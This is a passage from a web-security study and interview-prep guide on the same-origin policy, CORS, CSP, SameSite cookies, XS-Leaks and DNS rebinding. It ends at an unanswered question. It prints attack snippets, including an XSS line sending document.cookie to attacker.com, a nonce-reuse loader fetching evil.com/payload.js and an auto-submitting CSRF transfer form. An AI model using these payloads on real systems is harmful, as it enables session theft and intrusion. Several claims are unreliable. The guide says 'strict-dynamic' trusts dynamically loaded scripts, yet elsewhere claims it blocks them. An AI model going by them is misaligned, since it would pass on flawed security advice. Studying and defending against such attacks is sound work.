  Tools: https://github.com/bhavesh-pardhi/Wordlist-Hub/tree/main/JSONP
  (Database of known JSONP endpoints on popular CDNs)

DEFENSE:
  Avoid domain allowlists in script-src.
  Use nonces or hashes instead.
  'strict-dynamic' + nonce: even if you have a domain allowlist,
  'strict-dynamic' ignores those entries in favor of nonce-trusted scripts,
  preventing the JSONP attack vector.
```

---

### Attack 4: XS-Leaks (Cross-Site Leaks) — Timing Side Channels

```
ATTACK: Cross-Site Timing Attack on Conditional Resources
───────────────────────────────────────────────────────────────────────────────

BACKGROUND:
  SOP prevents reading cross-origin response CONTENT.
  But: SOP does NOT prevent timing attacks.
  Browser timing APIs reveal WHEN a request completes.

ATTACK: Determine if a user is logged into bank.com
  From attacker.com, load an image from bank.com:
  
  <img src="https://bank.com/account-dashboard-image.png"
       onload="record(Date.now())"
       onerror="recordError(Date.now())">
  
  Scenario A (logged in): bank.com serves the authenticated dashboard image
    → response time: ~200ms (image loaded)
    → img onerror fires: false (loaded successfully)
    
  Scenario B (not logged in): bank.com redirects to /login
    → /login serves a different image (or no image)
    → response time: ~50ms (faster, different resource)
    → can distinguish via timing alone
  
  Result: attacker knows whether victim is logged into bank.com

MORE SOPHISTICATED: Cache probing
  1. Attacker loads https://cdn.example.com/large-proprietary-asset.js
     (Fails: 403 Forbidden from cross-origin)
  2. Attacker checks HOW LONG the failure took:
     - Fast fail (1-5ms): resource might be cached in browser (was loaded before)
     - Slow fail (50-200ms): must fetch from server (not cached)
  3. By timing the "failure," attacker learns whether victim recently visited
     a site that loaded this asset → infers browsing history
  
WHY SOP DOESN'T PREVENT THIS:
  SOP prevents reading response CONTENT.
  Timing, status codes (via load/error events), resource SIZE (via timing API),
  and redirect counts are observable SIDE CHANNELS that don't require reading content.
  
  Partial defenses:
  - COEP (Cross-Origin Embedder Policy): opt-in isolation
  - CORP (Cross-Origin Resource Policy): opt-in for resources
  - Fetch metadata headers (Sec-Fetch-*): server can reject suspicious requests
  - Cache isolation by top-level site (Chrome 86+): separate cache per eTLD+1
```

---

### Attack 5: Prototype Pollution in CSP Nonce Bypass

```
ATTACK: DOM-Based CSP Bypass via Prototype Pollution
───────────────────────────────────────────────────────────────────────────────

CONTEXT:
  CSP: script-src 'nonce-abc123'
  
  Application uses a popular JavaScript library that has prototype pollution.
  Attacker can modify Object.prototype.__proto__ or specific object prototypes.

ATTACK CHAIN:
  1. Attacker finds prototype pollution in the app:
     https://app.example.com/?__proto__[innerHTML]=<script>evil()</script>
     
     This modifies Object.prototype.innerHTML, so that when any code does:
     element.innerHTML = ''  // empty string is falsy
     It actually sets: element.innerHTML = '<script>evil()</script>'
     (via prototype chain, the polluted property is found instead of the own property)
  
  2. If the CSP includes 'unsafe-eval' OR if there's a DOM sink that creates
     script elements and copies the parent element's nonce:
     
     // Some template libraries do:
     var script = document.createElement('script');
     script.nonce = document.currentScript.nonce;  // Copies parent nonce
     script.innerHTML = userControlledCode;  // Prototype pollution hits here
     document.head.appendChild(script);
  
  3. The attacker-controlled script executes with the valid nonce.

DIRECT CSP-NONCE BYPASS:
  Some implementations expose the nonce via:
  document.querySelector('script').nonce
  
  Attacker code (injected via DOM XSS before nonce validation):
  var nonce = document.querySelector('[nonce]').nonce;
  var s = document.createElement('script');
  s.nonce = nonce;
  s.src = 'https://evil.com/payload.js';
  document.body.appendChild(s);
  
  Why this works: the nonce is the SAME for all scripts in this response.
  If the attacker can run ANY JavaScript (even through a non-nonce channel
  like a DOM XSS that doesn't need the nonce), they can read the nonce
  and create new nonce-bearing scripts.
  
  Defense: 'strict-dynamic' prevents new script elements from being created
  by attacker-injected code even if they have the right nonce, because
  strict-dynamic requires the nonce to be on the ORIGINAL HTML element
  served by the server — not on dynamically created elements.
```

---

## 6. Security Controls & Defensive Mechanics

### Strict CORS Configuration

```
SECURE CORS IMPLEMENTATION CHECKLIST:
───────────────────────────────────────────────────────────────────────────────

1. EXACT ORIGIN MATCHING (not prefix/suffix/regex):
   
   # Python/Flask example
   ALLOWED_ORIGINS = frozenset({
       'https://app.example.com',
       'https://admin.example.com'
   })
   
   def is_allowed_origin(origin):
       return origin in ALLOWED_ORIGINS
       # NOT: origin.endswith('example.com')  ← bypassed by attacker.example.com
       # NOT: 'example.com' in origin         ← bypassed by evil-example.com
       # NOT: origin.startswith('https://example') ← bypassed by https://example.evil.com

2. ALWAYS SET Vary: Origin WHEN REFLECTING:
   response.headers['Vary'] = 'Origin'
   # Critical for CDN caching correctness

3. NEVER ALLOW CREDENTIALS WITH WILDCARD:
   # This is spec-invalid and browsers reject it anyway:
   # ACAO: *
   # ACAC: true  → browsers will IGNORE this and block the response

4. NULL ORIGIN HANDLING:
   # Never allow null origin with credentials
   if origin == 'null':
       # Don't set CORS headers (reject)
       # OR: return ACAO: null WITHOUT ACAC: true (prevents credential theft)
       pass

5. PREFLIGHT METHODS: don't over-expose:
   # Only allow methods your API actually supports
   # Don't copy-paste ACAM: GET, POST, PUT, PATCH, DELETE, HEAD, OPTIONS
   # if you only use GET and POST

6. LOGGING:
   # Log all CORS decisions:
   logger.info(f"CORS: origin={origin} method={method} "
               f"allowed={origin in ALLOWED_ORIGINS}")
   # Alert on: high volume of CORS rejections (active exploitation attempt)
```

---

### Strong CSP Configuration

```
PRODUCTION-GRADE CSP CONFIGURATION:
───────────────────────────────────────────────────────────────────────────────

PHASE 1: Report-Only mode (deploy without breaking anything)
Content-Security-Policy-Report-Only: 
  default-src 'none';
  script-src 'self' 'nonce-{NONCE}';
  style-src 'self' 'nonce-{NONCE}';
  img-src 'self' data:;
  font-src 'self';
  connect-src 'self';
  form-action 'self';
  base-uri 'self';
  report-uri /csp-report;

PHASE 2: Analyze violations (collect 2-4 weeks of data)
  Violations reveal: inline scripts that need nonces, CDN resources needed,
  analytics/chat widget connections needed, etc.

PHASE 3: Deploy enforcement with necessary allowances
Content-Security-Policy:
  default-src 'none';
  script-src 'strict-dynamic' 'nonce-{NONCE}' 'unsafe-inline';
    /* 'unsafe-inline' is ignored when nonce is present (for modern browsers)
       but provides fallback for CSP Level 1 browsers */
  style-src 'self' https://fonts.googleapis.com 'nonce-{NONCE}';
  img-src 'self' data: https:;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://api.example.com;
  form-action 'self';
  frame-ancestors 'none';    /* Replaces X-Frame-Options: DENY */
  base-uri 'self';
  upgrade-insecure-requests;
  report-to csp-endpoints;
  report-uri /csp-report;    /* Legacy fallback */

REPORT-TO HEADER (modern reporting API):
Report-To: {
  "group": "csp-endpoints",
  "max_age": 86400,
  "endpoints": [{"url": "https://csp-report.example.com/collect"}]
}

WHAT 'strict-dynamic' DOES:
  Traditional CSP: whitelist sources → attackers find JSONP on whitelisted CDNs
  strict-dynamic: trust flows from nonce-ed scripts to THEIR loaded scripts
  
  With 'strict-dynamic':
  1. Only scripts loaded directly from server with a valid nonce are trusted initially
  2. Scripts loaded BY those trusted scripts are ALSO trusted (regardless of source)
  3. Domain allowlists are IGNORED (cdnA.com in the policy is irrelevant)
  4. This prevents: JSONP bypass, malicious CDN scripts
  5. But: if a trusted script dynamically loads from attacker.com, that loads too
     → Trusted scripts must vet what they load
  
  WHY KEEP 'unsafe-inline'?
  'strict-dynamic' makes 'unsafe-inline' ignored by CSP3-aware browsers.
  Adding 'unsafe-inline' as a fallback ensures that BROWSERS without CSP3 support
  still get some protection from older-style inline XSS.
  Modern browsers ignore 'unsafe-inline' when a nonce is present.
```

---

### Fetch Metadata Headers (Defense-in-Depth)

```
FETCH METADATA HEADERS (server-side defense)
───────────────────────────────────────────────────────────────────────────────

Modern browsers add Sec-Fetch-* headers to all requests.
These cannot be set by JavaScript (browser-controlled headers).
Servers can use them to reject suspicious cross-origin requests.

Sec-Fetch-Site: cross-site | same-origin | same-site | none
  cross-site: request comes from a completely different site
  same-origin: same exact origin
  same-site: same eTLD+1 but different origin
  none: user direct navigation (typing in address bar, bookmarks)

Sec-Fetch-Mode: cors | navigate | no-cors | same-origin | websocket
  cors: explicit fetch with mode: cors
  navigate: top-level navigation
  no-cors: opaque request (e.g., img src)
  same-origin: same-origin fetch

Sec-Fetch-Dest: document | script | style | image | font | ...
  Destination type of the request

RESOURCE ISOLATION POLICY:
  Server-side middleware that rejects:
  - Cross-site requests that are NOT navigations to non-GET resources
  - Requests that look like CSRF attempts
  
  def resource_isolation_policy(request):
      site = request.headers.get('Sec-Fetch-Site', 'none')
      mode = request.headers.get('Sec-Fetch-Mode', 'navigate')
      dest = request.headers.get('Sec-Fetch-Dest', 'empty')
      
      # Allow: same-origin requests
      if site == 'same-origin':
          return True
      
      # Allow: navigations from outside (links, bookmarks)
      if mode == 'navigate' and site in ['cross-site', 'none']:
          # But NOT if this is being embedded in a frame
          if dest != 'iframe' and dest != 'frame':
              return True
      
      # Allow: CORS requests (server will apply CORS policy separately)
      if mode == 'cors':
          return True
      
      # Allow: Sec-Fetch-Site is absent (old browser, no header support)
      if not request.headers.get('Sec-Fetch-Site'):
          return True
      
      # Block: everything else (CSRF, cross-site state-changing requests)
      return False
```

---

## 7. Attack Surface Mapping

```
╔══════════════════════════════════════════════════════════════════════════════╗
║            BROWSER SECURITY MODEL: ATTACK SURFACE MAP                      ║
╚══════════════════════════════════════════════════════════════════════════════╝

ENTRY POINTS FOR BYPASSING SOP:
═══════════════════════════════════════════════════════════════════════════════

VECTOR 1: Subdomain Takeover → Origin Expansion
  attack.example.com → claimed by attacker via abandoned DNS CNAME
  CNAME: attack.example.com → attacker-bucket.s3.amazonaws.com
  Attacker serves: attack.example.com (valid cert via Let's Encrypt)
  SOP: attack.example.com != app.example.com (DIFFERENT ORIGIN)
  BUT: Many apps whitelist *.example.com in CORS
  Attacker origin: https://attack.example.com → CORS allowed!
  Attacker reads all authenticated API responses.

VECTOR 2: postMessage → Cross-Frame Communication Bypass
  If iframe origin sends via postMessage without checking event.origin:
  
  window.addEventListener('message', function(e) {
      // WRONG: not checking e.origin
      document.getElementById('output').innerHTML = e.data;
  });
  
  Attacker's site sends: targetFrame.postMessage('<img src=x onerror=evil()>', '*');
  SOP doesn't protect postMessage — origin check is application responsibility.

VECTOR 3: Open Redirect → CORS Origin Manipulation
  If example.com has: /redirect?url=https://attacker.com
  Some CORS libraries check the Referer header (not Origin) or follow redirects
  incorrectly. After the redirect, the Origin header may be set to null.

VECTOR 4: DNS Rebinding → SOP Bypass via Hostname Reuse
  1. Attacker controls: attacker.com with TTL=1s DNS record
  2. Victim visits attacker.com → resolves to attacker's IP (200.0.0.1)
  3. JavaScript starts executing in origin https://attacker.com
  4. Attacker changes DNS: attacker.com now points to 192.168.1.1 (victim's internal network)
  5. JavaScript makes fetch('https://attacker.com/api')
  6. Browser checks: is this cross-origin? NO — hostname is the same (attacker.com)
  7. Browser connects to 192.168.1.1 (internal service) using attacker.com's origin!
  8. SOP doesn't apply — it's "same origin" at the browser level
  9. JavaScript reads response from internal service

  WHY THIS WORKS:
  SOP checks origin at the time of script execution, not at connection time.
  The browser connects to the new IP but the origin context is still attacker.com.
  Defense: Private Network Access (Chrome) — forbids public sites from accessing
           private IP ranges without explicit opt-in.
```

```
ATTACK SURFACE TOPOLOGY:

[Attacker's Origin: https://attacker.com]
         │
         │ CORS attack vectors:
         ├── Reflected Origin CORS config
         ├── null Origin bypass
         ├── Subdomain takeover on allowlisted domain
         │
         ▼
[Target App: https://app.example.com]
         │
         │ SOP protects: reading cross-origin responses
         │ SOP does NOT protect:
         ├── Sending requests (CSRF)
         ├── Timing side channels (XS-Leaks)
         ├── postMessage without origin check
         ├── DNS rebinding
         │
         ▼
[API: https://api.example.com]
         │
         │ CORS headers control what browsers allow
         │ Servers ALWAYS receive the request regardless of CORS
         │ CORS is BROWSER-ENFORCED, not SERVER-ENFORCED
         │
         ▼
[CSP entry points — what executes in the page:]
         ├── Inline scripts (blocked without 'unsafe-inline' or nonce)
         ├── CDN scripts (must be in script-src OR use strict-dynamic)
         ├── DOM sinks (innerHTML, document.write — not blocked by CSP alone)
         ├── JSONP endpoints on allowlisted domains
         ├── eval() (blocked without 'unsafe-eval')
         └── Trusted Types API (Chrome) — prevents DOM sink injection

TRUST BOUNDARIES:
  ═══ Scheme boundary (https:// vs http://)
  ─── Hostname boundary (app.example.com vs api.example.com)
  ··· eTLD+1 boundary (example.com vs evil.com) — SameSite enforcement
  
  INSIDE browser tab: SOP enforced for all cross-origin access
  INSIDE same origin: no SOP restrictions
  BETWEEN iframes: SOP based on src origin, postMessage for communication
  TO/FROM server: CORS headers control browser's decision
  WITHIN page: CSP controls what resources load
```

---

## 8. Failure Points & Misconfigurations

### Production CSP Breaking Legitimate Traffic

```
COMMON CSP VIOLATIONS THAT BREAK LEGITIMATE FEATURES:
───────────────────────────────────────────────────────────────────────────────

VIOLATION 1: Analytics and monitoring scripts
  Problem: CSP blocks third-party analytics (Google Analytics, Datadog RUM)
  Symptom: Analytics dashboard shows zero data after CSP deployment
  Fix: Add analytics domains to connect-src and script-src
       OR: use a self-hosted proxy for analytics
  
  Operational risk: Without analytics, you're blind to user experience issues.
  
VIOLATION 2: Inline event handlers in legacy HTML
  <button onclick="doSomething()">Click me</button>
  <a href="javascript:void(0)" onclick="...">Link</a>
  
  Problem: 'unsafe-inline' must be in script-src (defeats XSS protection)
  Fix: Convert to addEventListener() in separate script files
  
  But: if the codebase has 10,000 inline handlers, migration takes months.
  Interim: use 'unsafe-inline' but add nonce for new scripts.
  Note: nonce doesn't help inline event handlers — they're script-src violations
        even with a nonce on the page (nonces apply to <script> elements, not handlers)
  
VIOLATION 3: Web workers, service workers
  Problem: If worker scripts aren't included in script-src:
  // This fails if worker.js URL not in script-src:
  new Worker('https://cdn.example.com/worker.js')
  
  Fix: Add worker-src directive (if absent, falls back to script-src then child-src)
  
VIOLATION 4: CSS in-line styles (commonly set by JavaScript)
  element.style.background = 'url(data:image/png;base64,...)';
  
  If style-src doesn't include 'unsafe-inline' or data::
  Some libraries (React inline styles, Material-UI) may use this pattern.
  
VIOLATION 5: Fonts and icons loaded by CSS
  CSS: @font-face { src: url('https://fonts.gstatic.com/...') }
  
  The font URL is in CSS, but the browser enforces font-src on the actual font fetch.
  If font-src is missing (falls to default-src 'self'): fonts don't load.
  Icons disappear (if using icon fonts). Layout breaks.
```

---

### CORS Headers on Non-HTML Responses

```
DANGEROUS CORS MISCONFIGURATION: Adding CORS to everything
───────────────────────────────────────────────────────────────────────────────

Many developers add CORS middleware globally to all routes including:
  - /health → returns {status: "ok"} (no credentials, low risk)
  - /internal/admin → requires auth, returns all user data (HIGH RISK)
  - /api/public → no auth required, public data (no credentials, safe)
  - /api/user/data → requires auth, returns user PII (HIGH RISK with bad CORS)

SPECIFIC VULNERABILITY PATTERN:
  Global CORS middleware with reflected origin + credentials=true
  Applied to ALL routes including:
  
  GET /internal/debug → returns system info, env vars, database config
  
  ACAO: (reflected attacker.com)
  ACAC: true
  
  An attacker's page can now read:
  - Database connection strings
  - API keys in environment variables
  - Internal service topology
  - User session data

CORRECT APPROACH:
  Apply CORS selectively:
  - Public APIs: ACAO: * (no credentials)
  - Authenticated APIs: exact origin allowlist, ACAC: true
  - Admin APIs: no CORS headers at all (or allowlist only internal tools)
  - Internal endpoints: DENY cross-origin access entirely

PROPAGATION DELAY BUG:
  If Max-Age is long (86400 seconds = 24 hours):
  Changing CORS config takes effect immediately on the SERVER.
  But clients that have cached the old preflight continue using the old config.
  
  Scenario: You remove attacker.com from CORS allowlist.
  Server: immediately stops reflecting attacker.com.
  But: attacker had a preflight cached with max-age=86400.
  Their requests continue to work for up to 24 hours.
  
  Mitigation: use short max-age (300-3600) for production config.
  If immediate revocation needed: use max-age: -1 (forces preflight every time).
```

---

### SameSite Cookie Misconfigurations

```
SAMESITE FAILURE MODES:
───────────────────────────────────────────────────────────────────────────────

PROBLEM: SameSite=Strict breaks OAuth/OIDC flows

Flow:
  1. User on attacker.com clicks "Login with Google"
  2. Google's login page POST redirects to: https://app.example.com/callback?code=...
  3. app.example.com sets SameSite=Strict session cookie
  
  OR: User is already logged into app.example.com with SameSite=Strict
  User on other-site.com clicks a link to app.example.com
  
  Result: The session cookie is NOT sent on this cross-site navigation
  User appears to be logged out (even though they have a valid session)
  
  This is the correct SameSite=Strict behavior — but it's confusing UX.

SOLUTION: Use SameSite=Lax for session cookies + CSRF tokens for state-changing actions
  SameSite=Lax: allows top-level GET navigations from external sites (links, bookmarks)
  Does NOT allow: form POST from other sites (main CSRF vector blocked)
  Combine with: CSRF token for POST/PUT/DELETE endpoints (defense in depth)

PROBLEM: SameSite=Lax doesn't protect against CSRF via top-level POST navigation
  Some CSRF attacks use:
  <form method="POST" action="https://bank.com/transfer">
    <input name="amount" value="1000">
    <input name="to" value="attacker">
    <input type="submit">
  </form>
  <script>document.forms[0].submit()</script>
  
  SameSite=Lax BLOCKS this: POST from a different site → cookie not sent!
  
  But: what about GET-based state-changing actions?
  GET /bank/transfer?amount=1000&to=attacker
  SameSite=Lax ALLOWS this: GET top-level navigation from other site → cookie sent
  
  This is why: GET requests MUST be idempotent (no state changes).
  Any bank that accepts state-changing GET requests is vulnerable with SameSite=Lax.
```

---

## 9. Mitigations & Observability

### CSP Violation Reporting Infrastructure

```
CSP REPORTING IMPLEMENTATION:
───────────────────────────────────────────────────────────────────────────────

Browser sends to report-uri on violation:
POST /csp-report
Content-Type: application/csp-report

{
  "csp-report": {
    "document-uri": "https://app.example.com/dashboard",
    "referrer": "",
    "violated-directive": "script-src",
    "effective-directive": "script-src",
    "original-policy": "default-src 'self'; script-src 'self' 'nonce-abc123'",
    "disposition": "enforce",    // or "report" if CSPRO
    "blocked-uri": "https://evil.com/malicious.js",
    "line-number": 47,
    "column-number": 12,
    "source-file": "https://app.example.com/static/app.js",
    "status-code": 0,
    "script-sample": "malicious.j"   // First 40 chars of blocked script
  }
}

FILTERING OUT NOISE:
  ~60-90% of CSP reports are false positives:
  - Browser extensions injecting content (Grammarly, LastPass)
  - Antivirus software modifying page content
  - ISPs injecting analytics (mobile operators)
  - Crawler bots that don't honor CSP
  
  Filter rules:
  1. Ignore reports where blocked-uri is empty string or 'self'
  2. Ignore reports where source-file starts with "moz-extension://"
     or "chrome-extension://"
  3. Ignore reports from known bot user-agents
  4. Group by: violated-directive + blocked-uri (count, don't alert on every one)
  5. Alert on: new blocked-uri that appears many times rapidly (active injection)
  6. Alert on: violated-directive=script-src (highest severity)
  7. Monitor trend: baseline violations per day. Alert on: 10x spike

METRICS TO COLLECT:
  # Grafana/Prometheus metrics from CSP report endpoint:
  
  csp_violations_total{
    directive="script-src|style-src|img-src|connect-src",
    disposition="enforce|report",
    page_path="/dashboard|/checkout|/..."
  }
  
  csp_blocked_uri_total{
    blocked_origin="evil.com|extension://...",
    disposition="enforce|report"
  }
  
  # Alert: any new external domain in script-src violations
  # (someone trying to load unauthorized scripts)
  alert: csp_blocked_uri{directive="script-src", 
                          blocked_origin!~"chrome-extension.*|moz-extension.*"} > 100
```

---

### Security Headers Deployment Checklist

```
SECURITY HEADERS DEPLOYMENT:
───────────────────────────────────────────────────────────────────────────────

MINIMUM BASELINE (every production web application):

# X-Frame-Options: Prevents clickjacking (legacy browsers)
X-Frame-Options: DENY
# Superseded by: frame-ancestors 'none' in CSP (but keep for IE/old browsers)

# X-Content-Type-Options: Prevents MIME sniffing
X-Content-Type-Options: nosniff
# Prevents: browser executing text/plain as JavaScript when served without 
# proper Content-Type header

# Referrer-Policy: Controls Referer header leakage
Referrer-Policy: strict-origin-when-cross-origin
# Same-origin requests: full URL in Referer
# Cross-origin requests: only scheme+origin (no path/query)
# From HTTPS to HTTP: no Referer (prevents leaking to downgrade)

# Permissions-Policy: Restricts browser feature access
Permissions-Policy: geolocation=(), microphone=(), camera=(), 
                    payment=(), usb=(), display-capture=()
# Prevents malicious scripts from accessing sensitive browser APIs

# Cross-Origin Resource Policy (CORP)
Cross-Origin-Resource-Policy: same-site
# Prevents other sites from embedding this resource (images, fonts, etc.)
# Defends against Spectre-based attacks

# Cross-Origin Embedder Policy (COEP) 
Cross-Origin-Embedder-Policy: require-corp
# Page will only load cross-origin resources that have CORP or CORS headers
# Required for SharedArrayBuffer / high-resolution timing (security isolation)

# Cross-Origin Opener Policy (COOP)
Cross-Origin-Opener-Policy: same-origin
# Prevents cross-origin pages from keeping a reference to your window
# Required with COEP for full cross-origin isolation
# (breaks: pop-up OAuth flows if OAuth page doesn't set matching headers)

# HSTS (must be set carefully — hard to undo)
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
# Locks all connections to HTTPS for 2 years
# preload: submit to browser HSTS preload list (all users, even first visit)
# DANGER: if you ever need HTTP for any subdomain in the future: impossible to undo

MONITORING THESE HEADERS:
  Use securityheaders.com API for automated scanning
  Alert if any security header is removed from production responses
  Include headers in smoke tests after deployments
```

---

### CORS Logging and Monitoring

```
WHAT TO LOG AND MONITOR FOR CORS:
───────────────────────────────────────────────────────────────────────────────

LOG EVERY CORS DECISION:
  {
    "timestamp": "2024-05-15T12:00:00Z",
    "request_origin": "https://attacker.com",
    "requested_url": "https://api.example.com/v1/admin/users",
    "method": "POST",
    "cors_decision": "REJECTED",
    "reason": "Origin not in allowlist",
    "user_agent": "Mozilla/5.0...",
    "request_id": "req-abc123"
  }

ALERTS TO SET UP:

1. CORS rejection rate spike:
   If CORS rejections increase by 10x in 5 minutes:
   Could be: legitimate frontend bug, or active CSRF/CORS exploitation attempt
   
2. New origin in CORS rejection logs:
   Any NEW origin attempting to make credentialed requests to sensitive endpoints
   Alert immediately — could be subdomain takeover + CORS exploitation

3. Repeated rejections from same IP/origin:
   An attacker probing CORS configuration (trying different origins)
   Alert on: same IP trying > 50 different origins in 10 minutes

4. Origin header anomalies:
   Origins with unusual formatting (unicode, IP addresses, port numbers)
   Could be: parser confusion attacks
   Alert on: Origins matching: null, 127.0.0.1, localhost, 0.0.0.0

INFRASTRUCTURE-AS-CODE CORS VALIDATION:
  # OPA policy to validate CORS config in Terraform
  
  deny[msg] {
    resource := input.resource
    resource.type == "aws_api_gateway_resource"
    cors_config := resource.change.after.cors_configuration[_]
    cors_config.allow_credentials == true
    cors_config.allow_origins[_] == "*"
    msg := "CORS config cannot allow credentials with wildcard origin"
  }
  
  deny[msg] {
    resource := input.resource
    resource.type == "aws_api_gateway_resource"
    cors_config := resource.change.after.cors_configuration[_]
    # Check for obviously dangerous origin patterns
    origin := cors_config.allow_origins[_]
    endswith(origin, ".example.com")  # Dangerous: allows subdomain takeover
    msg := sprintf("CORS wildcard subdomain config detected: %v", [origin])
  }
```

---

## 10. Interview Questions

### Q1: Explain the exact difference between Same-Origin Policy (SOP), Same-Site, and Cross-Origin Resource Sharing (CORS). What does each protect against and what are their boundaries?

**Direct answer:**

**Same-Origin Policy (SOP)**: The browser's fundamental isolation mechanism. Two pages are same-origin if AND ONLY IF they share the exact same scheme, hostname, AND port. `https://app.example.com:443` and `https://api.example.com:443` are different origins despite sharing `example.com`. SOP prevents one origin's JavaScript from READING resources from another origin. It does NOT prevent SENDING requests (which is why CSRF is possible).

**Same-Site**: A LOOSER boundary defined as the eTLD+1. `https://app.example.com` and `https://api.example.com` are the same site (both `example.com`). `https://app.example.com` and `https://app.evil.com` are different sites. SameSite cookies control which cross-site requests include the cookie. SameSite protects against CSRF (cross-site form submissions), not against cross-origin JavaScript access.

**CORS**: A mechanism for servers to explicitly declare that certain cross-origin requests are allowed. CORS relaxes SOP for specific origins. Without CORS headers, a JavaScript `fetch()` to a different origin succeeds but the browser hides the response from JavaScript (opaque response). With correct CORS headers, the browser exposes the response. CORS protects: nothing on its own — it only controls what the browser exposes. It does NOT prevent the request from reaching the server.

**What each protects:**
- SOP: Prevents cross-origin JS from reading responses (stops UXSS, cross-origin data theft)
- SameSite: Prevents cross-site requests from carrying cookies (stops CSRF)
- CORS: Explicit policy for allowing cross-origin resource sharing (enables legitimate cross-origin apps)

**Critical insight**: CORS does NOT prevent CSRF. A form POST from evil.com to bank.com doesn't use `fetch()` — it's a direct form submission. SameSite=Lax cookies prevent this. CORS is irrelevant here.

---

### Q2: Why can't a server just set `Access-Control-Allow-Origin: *` and `Access-Control-Allow-Credentials: true` together? What is the fundamental security issue this prevents?

**Direct answer:**

The browser explicitly prohibits this combination and treats it as an error. The specification says: if credentials are included in a request (cookies, HTTP auth), the ACAO header MUST be an exact origin (not `*`). Why?

**The attack it prevents:**

If a browser allowed `ACAO: *` + `ACAC: true`, then the following would work from ANY attacker-controlled page:

```javascript
fetch('https://bank.com/transfer?amount=1000&to=attacker', {
    credentials: 'include'  // sends victim's session cookie
})
```

With `ACAO: *`, the browser would expose the response to any origin's JavaScript. With `ACAC: true`, the cookie would be included. Any page on the internet could read authenticated responses from bank.com while sending the victim's credentials.

The `*` wildcard means "any origin can read this response." Credentials mean "include the user's session/identity." Combining these would make every authenticated endpoint on the internet accessible to every malicious site.

**Why exact origin matching is the solution:**

When the server specifies `ACAO: https://app.example.com`, it's making a deliberate trust decision: "I trust `app.example.com` specifically to read my authenticated responses." The browser enforces that the requesting origin EXACTLY matches this — not any random attacker site.

**What if:** What if a developer genuinely needs to allow many origins to make credentialed requests? They must maintain an explicit allowlist and dynamically reflect the matched origin — no shortcut exists. The operational burden is intentional: it forces developers to consciously enumerate every trusted origin.

---

### Q3: A developer deploys a CORS configuration that checks if the Origin header "contains" their domain name (e.g., `origin.includes('example.com')`). Provide three distinct ways to bypass this.

**Direct answer:**

**Bypass 1: Subdomain prefix**
Register `evil-example.com`. The check `'evil-example.com'.includes('example.com')` returns `true`. An attacker who controls `evil-example.com` can make credentialed requests to the API.

**Bypass 2: Subdomain suffix**
Register `example.com.attacker.com`. The check `'example.com.attacker.com'.includes('example.com')` returns `true`. The domain is `attacker.com`, not `example.com`, but the string check passes.

**Bypass 3: Exploit a subdomain takeover on a legitimate subdomain**
If `old-feature.example.com` has a dangling CNAME to an abandoned cloud resource (AWS S3, Heroku, GitHub Pages), an attacker can claim that resource. Now they control `old-feature.example.com`. The check `'old-feature.example.com'.includes('example.com')` passes because it's actually a legitimate subdomain of example.com — the check is correct in matching the string, but the security assumption is wrong (the subdomain is now controlled by an attacker).

**Bonus - Bypass 4: null origin exploitation**
If the code is `if (!origin || origin.includes('example.com')) { setHeader(origin) }`, a null origin passes the `!origin` branch. Sandboxed iframes can generate null-origin requests from any attacker page.

**The correct fix:** Use a Set of exact allowed origins and check membership with `ALLOWED_ORIGINS.has(origin)`. No string matching of any kind.

---

### Q4: Explain the CORS preflight mechanism. When is it triggered? What happens if the server crashes after receiving the preflight but before responding? Is there a security concern with caching preflights?

**Direct answer:**

**Preflight trigger conditions** — a request requires preflight when ANY of these are true:
1. Method is not GET, POST, or HEAD
2. Content-Type is not `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain`
3. The request includes non-simple headers (Authorization, X-Custom-Header, etc.)
4. A ReadableStream body is used
5. `credentials: 'include'` is set AND the request is non-simple in any other way

**What happens if the server crashes after receiving the preflight:**

The browser waits for the OPTIONS response. If the TCP connection closes or times out, the browser gets a network error for the OPTIONS request. The browser treats this as a CORS failure — it does NOT send the actual request. The original `fetch()` promise rejects with a network error. No preflight cache entry is created. The request did NOT reach the server (the actual POST/DELETE/etc. was never sent).

**Security concern with preflight caching:**

If `Access-Control-Max-Age: 86400` (24 hours) is set, and the server later REMOVES a method or header from its CORS policy, clients with cached preflights continue to send those requests for up to 24 hours. The server now receives requests without a valid preflight cache, but because the browser skips the preflight (using the cache), the server might reject the actual request. This causes a confusing failure mode: the server SHOULD be enforcing CORS on the actual response too (checking ACAO on the actual POST response), not just relying on the preflight.

The deeper concern: an attacker who caches a preflight under favorable conditions (from their own visit to the API) doesn't benefit much — the cache is per-origin and the browser re-validates the origin on actual requests anyway. However, if there's a race condition in preflight cache invalidation across browser tabs from the same origin, stale permissions could persist briefly.

**What if:** What if there's no `Access-Control-Max-Age` header? The browser uses its default, which varies by browser (Chrome: 5 seconds in some versions, no explicit default in others). Setting `Max-Age: -1` forces a preflight before every request — highest security but worst performance.

---

### Q5: Walk through exactly what happens when a browser enforces a CSP and why `'unsafe-inline'` is so dangerous even when combined with domain allowlists.

**Direct answer:**

When the browser encounters a `<script>` tag or inline `<script>` block while parsing HTML, it checks the `script-src` directive (or `default-src` fallback). For an inline script (`<script>alert(1)</script>`), the browser checks:
1. Is `'unsafe-inline'` in the source list? → Allow
2. Is there a nonce in the source list that matches the `nonce=` attribute? → Allow
3. Is there a hash in the source list that matches the script's content? → Allow
4. None of the above → BLOCK, generate violation report

**Why `'unsafe-inline'` is so dangerous even with domain allowlists:**

Consider `script-src 'self' https://cdn.example.com 'unsafe-inline'`. The domain allowlist says "only load scripts from these domains." But `'unsafe-inline'` adds: "also execute any inline script on the page." 

If an attacker can inject HTML into the page (via XSS — a reflected parameter, a stored comment, a DOM sink), they can inject:
```html
<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
```

This executes immediately because `'unsafe-inline'` is present. The domain allowlist is irrelevant — the script isn't being "loaded" from a URL; it's inline. The entire purpose of CSP (blocking injected scripts) is defeated.

**The nonce solution:** With a per-request nonce, inline scripts only execute if they have the matching nonce attribute. Since the nonce is generated server-side and the attacker doesn't know it, they can't create a valid `<script nonce="...">` tag even if they can inject HTML. The attacker's injected `<script>` doesn't have the nonce → CSP blocks it.

**The catch:** If there's any XSS that allows executing existing JavaScript (via `eval()`, DOM clobbering, prototype pollution), the nonce can be read from the DOM and used to create new script elements. `'strict-dynamic'` prevents this by making the nonce irrelevant for dynamically-created scripts — only server-rendered nonce-bearing scripts are trusted, not dynamically injected ones.

---

### Q6: What is a XS-Leak attack? How does it bypass SOP, and what browser features are being used to close this gap?

**Direct answer:**

